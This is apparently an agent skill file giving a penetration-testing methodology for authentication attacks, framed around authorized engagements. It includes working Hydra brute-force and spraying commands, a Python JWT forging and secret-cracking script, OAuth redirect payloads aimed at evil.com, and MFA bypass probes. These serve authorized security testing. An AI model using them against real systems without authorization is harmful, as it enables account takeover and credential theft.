---
name: auth-attacks
description: Use when testing authentication on an authorized engagement.
  Covers user enumeration, password brute force and spraying, credential
  stuffing with the client's own test data, session fixation, JWT attacks
  (none algorithm, weak secrets, key confusion), OAuth and OpenID Connect
  flaws, and MFA bypass techniques strictly within authorized scope on test
  accounts. Use when assessing login flows, session handling, token-based
  auth, or single sign-on integrations.
version: 1.0.0
domain: auth
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [password-attacks]
tools:
  - name: Burp Suite
    version: "2026.2"
  - name: Hydra
    version: "9.5"
  - name: Python
    version: "3.12"
---

Authentication attacks target the login and session layer: guessing who
exists, guessing their secrets, abusing how sessions are issued, and
breaking token or single sign-on logic. This skill covers the authorized
methodology for each, with strict scope discipline. Credential stuffing and
MFA bypass work is done only with credentials and accounts the client
explicitly provided for testing, never with real user data or third party
breach dumps.

## Quick Workflow

1. Map the login surface: forms, APIs, SSO buttons, password reset,
   registration, and mobile endpoints.
2. Test user enumeration through response differences, timing, and
   reset flows.
3. Test rate limiting and lockout with a small number of deliberate
   attempts before any larger run.
4. Run password spraying and targeted brute force inside the agreed
   attempt limits.
5. Test session handling: fixation, cookie flags, timeout, and logout.
6. Attack JWTs: algorithm confusion, weak secrets, and claim tampering.
7. Attack OAuth/OIDC: redirect URI abuse, code leakage, and state issues.
8. Test MFA only on provided test accounts, within the agreed bypass
   scope.
9. Log every attempt count and timestamp so the client can correlate
   with their logs.

## 1. User enumeration

Find out which usernames exist before guessing passwords.

```bash
# Compare login responses for valid vs invalid users
curl -s -X POST 'https://target.example/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"user":"realuser","pass":"wrong"}' | head -c 200
curl -s -X POST 'https://target.example/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"user":"nouser99999","pass":"wrong"}' | head -c 200

# Timing probe: some apps hash only for existing users (slower response)
for u in realuser nouser99999; do
  time curl -s -o /dev/null -X POST 'https://target.example/api/login' \
    -d "{\"user\":\"$u\",\"pass\":\"wrong\"}"
done

# Password reset enumeration
curl -s -X POST 'https://target.example/reset' -d "email=real@example.com"
curl -s -X POST 'https://target.example/reset' -d "email=nope@example.com"
```

Also check registration ("username taken"), contact forms, and verbose
API error codes. Record every oracle; enumeration alone is a finding.

## 2. Brute force and password spraying

Confirm lockout and rate limit behavior with a handful of attempts first,
then run inside the agreed limits.

```bash
# Hydra against a form login (small, polite run)
hydra -l admin -P /tmp/candidates.txt target.example https-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid" -t 2 -w 5

# Password spraying: one common password across many users (low noise)
hydra -L /tmp/users.txt -p 'Winter2026!' target.example https-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid" -t 1 -W 10

# Check for missing rate limiting with a quick loop and watch for blocks
for i in $(seq 1 20); do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST \
    'https://target.example/api/login' -d '{"user":"admin","pass":"x"}')
  echo "attempt $i -> $code"
done
```

Rules: never exceed the agreed attempts per account, stop at the first
lockout signal, prefer spraying (few attempts per user, many users) over
hammering one account, and avoid production hours unless agreed.

## 3. Credential stuffing (authorized scope only)

Credential stuffing replays username/password pairs from other breaches.
Only do this with a credential set the client provided (for example their
own test accounts), never with real breach compilations against real users.

```bash
# Format: user:pass per line, from the client's provided test set
hydra -C /tmp/client_test_creds.txt target.example https-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid" -t 2 -w 10

# Detect password reuse signal without locking accounts:
# stop the run on first success per user and throttle between attempts
```

If the client wants real-world exposure measured, recommend they run their
own users' hashes against breach corpora internally instead of you testing
live logins.

## 4. Session fixation and session handling

Test whether the application lets an attacker fix a victim's session ID.

```bash
# 1. Get a session ID before login
curl -s -c /tmp/pre.txt 'https://target.example/login' -o /dev/null
PRE=$(grep -i session /tmp/pre.txt | awk '{print $NF}')

# 2. Log in with that cookie jar and see if the ID survives login
curl -s -b /tmp/pre.txt -c /tmp/post.txt -X POST \
  'https://target.example/login' -d "user=test&pass=Test123!"
diff /tmp/pre.txt /tmp/post.txt

# 3. If the ID is unchanged after login, fixation is possible:
#    the attacker sets this ID in the victim's browser before they log in.
```

```bash
# Cookie flag and lifetime checks
curl -sI 'https://target.example/' | grep -i 'set-cookie'
# Look for: Secure, HttpOnly, SameSite=Lax|Strict, reasonable Max-Age

# Logout must invalidate server side: reuse the old cookie after logout
curl -s -b /tmp/post.txt 'https://target.example/account' -o /dev/null -w '%{http_code}\n'
```

Also test concurrent session behavior, session timeout on idle, and
whether password change kills other sessions.

## 5. JWT attacks

Decode the token, read the header, and test each classic weakness.

```bash
# Decode header and payload (no verification, just base64)
TOKEN="eyJhbGciOiJIUzI1NiIs..."
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null; echo
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null; echo
```

```python
#!/usr/bin/env python3
"""JWT weakness checks: none-alg, weak secret, kid traversal (lab use)."""
import base64, json, hmac, hashlib, sys

def b64d(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def b64e(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")

token = sys.argv[1].strip()
header_b, payload_b, sig = token.split(".")
header = json.loads(b64d(header_b))
payload = json.loads(b64d(payload_b))
print("[*] alg:", header.get("alg"), "| kid:", header.get("kid"))

# 1. none algorithm variant
none_token = b64e(json.dumps({"alg": "none", "typ": "JWT"}).encode()) \
    + "." + b64e(json.dumps(payload).encode()) + "."
print("[*] none-alg token:", none_token)

# 2. weak secret brute force (small demo list; use bigger lists in scope)
for secret in ["secret", "password", "123456", "target", "jwt"]:
    calc = b64e(hmac.new(secret.encode(), f"{header_b}.{payload_b}".encode(),
                          hashlib.sha256).digest())
    if hmac.compare_digest(calc, sig):
        print("[!] weak secret found:", secret)
        break

# 3. tamper a claim (e.g. role) keeping the original signature,
#    to see if the server skips verification
payload["role"] = "admin"
tampered = b64e(json.dumps(payload).encode())
print("[*] tampered payload (same sig):", header_b + "." + tampered + "." + sig)
```

Test each crafted token against an authenticated endpoint and watch for
200 vs 401. Also check: missing `exp`, overly long lifetime, `jku`/`x5u`
header pointing at attacker URLs, and `kid` values vulnerable to path
traversal or SQL injection.

## 6. OAuth and OpenID Connect flaws

Map the flow first: authorization endpoint, token endpoint, redirect URIs,
and scopes.

```bash
# Start a normal flow and capture the authorize URL
curl -s 'https://target.example/oauth/authorize?client_id=webapp&response_type=code&redirect_uri=https://target.example/cb&scope=openid&state=abc123' -D - -o /dev/null | grep -i location

# Redirect URI tests: try open redirectors, subdomains, path tricks
# https://target.example/cb.evil.com
# https://target.example/cb?next=https://evil.com
# https://target.example%2fcb@evil.com  (parser differentials)

# Check state parameter: remove it and see if the flow still completes
```

Key tests: authorization code leaked in referer or logs, `code` reusable
(no single use), missing or static `state` (CSRF on login), implicit flow
still enabled (`response_type=token` leaking tokens in the URL fragment),
overly broad scopes granted by default, and token endpoint without
`client_secret` validation for confidential clients. Test with two of your
own test accounts to check cross-account code redemption.

## 7. MFA bypass techniques (authorized scope, test accounts only)

Only against accounts the client gave you, and only bypass classes in the
agreed scope.

```bash
# Check whether the MFA step can be skipped by direct navigation
curl -s -b /tmp/premfa.txt 'https://target.example/account' -w '%{http_code}\n'

# Test OTP brute force space and rate limiting (6 digits = 1M space)
for code in 000000 111111 123456; do
  curl -s -X POST 'https://target.example/mfa/verify' \
    -b /tmp/premfa.txt -d "code=$code" | head -c 120; echo
done

# Response manipulation: some apps accept {"success":true} client side,
# or treat a missing mfa cookie as verified
```

Also test: OTP reuse after one use, overly long OTP validity, MFA reset
flows that fall back to email only, "remember this device" tokens that
never expire, and push-based MFA for missing number matching. Document
every bypass with the exact request that skipped the check.

## Edge cases

- Account lockout triggers after 5 attempts. Stop immediately, note the
  threshold, and switch to spraying with wider user lists and longer
  delays.
- CAPTCHA appears after a few attempts. Do not bypass it; report the
  control as working and test the API endpoint directly if it lacks the
  CAPTCHA.
- JWT uses RS256 but the server accepts HS256 with the public key as the
  HMAC secret. Fetch `/.well-known/jwks.json` or the public key file and
  test the confusion explicitly.
- OAuth `state` is validated but predictable. Predictable is as good as
  missing for login CSRF; prove it by fixing a victim flow with your own
  state value.
- Session ID rotates on login but the old ID stays valid server side.
  Rotation without invalidation is still fixation-adjacent; prove the old
  ID works after login.

## Escalation

- No enumeration oracle on login: pivot to reset, register, and support
  endpoints, then to timing attacks with more samples per user.
- Spraying finds nothing with common passwords: try seasonal and company
  specific patterns (company name plus year) within the attempt budget.
- JWT secret resists a small list: move to hashcat mode 16500 with a
  larger wordlist (see the password-attacks skill) if scope allows
  offline cracking.
- OAuth redirect validation looks strict: test parser differentials
  (trailing dots, URL-encoded slashes, `@` userinfo tricks) one at a time.
- MFA cannot be bypassed directly: check the recovery and enrollment
  flows, which are often weaker than the verify step.

## Detection and defender view

Defenders see authentication attacks as bursts of failed logins from few
IPs, many usernames tried from one IP (spraying), login attempts at odd
hours, session IDs that never rotate, and JWTs with `alg: none` or
tampered claims in API logs. Good defenses are rate limiting plus
progressive delays, lockout with alerting, MFA enforced server side on
every sensitive action, short-lived tokens with rotation, strict redirect
URI allowlists, and `state` plus PKCE on every OAuth flow.

## Key references

- MITRE ATT&CK T1110.001 (Brute Force: Password Guessing), T1110.003
  (Password Spraying), T1110.004 (Credential Stuffing), T1110.002
  (Password Cracking).
- MITRE ATT&CK T1550.001 (Use Alternate Authentication Material:
  Application Access Token).
- MITRE ATT&CK T1621 (Multi-Factor Authentication Request Generation).
- CWE-287 (Improper Authentication), CWE-307 (Improper Restriction of
  Excessive Authentication Attempts).
- CWE-384 (Session Fixation), CWE-798 (Use of Hard-coded Credentials).
- CWE-598 (Use of GET Request Method With Sensitive Query Strings):
  tokens in URLs.
- OWASP Testing Guide: Authentication Testing (OTG-AUTHN) and Session
  Management (OTG-SESS).
- RFC 8725 (JWT best practices), RFC 6749 (OAuth 2.0).
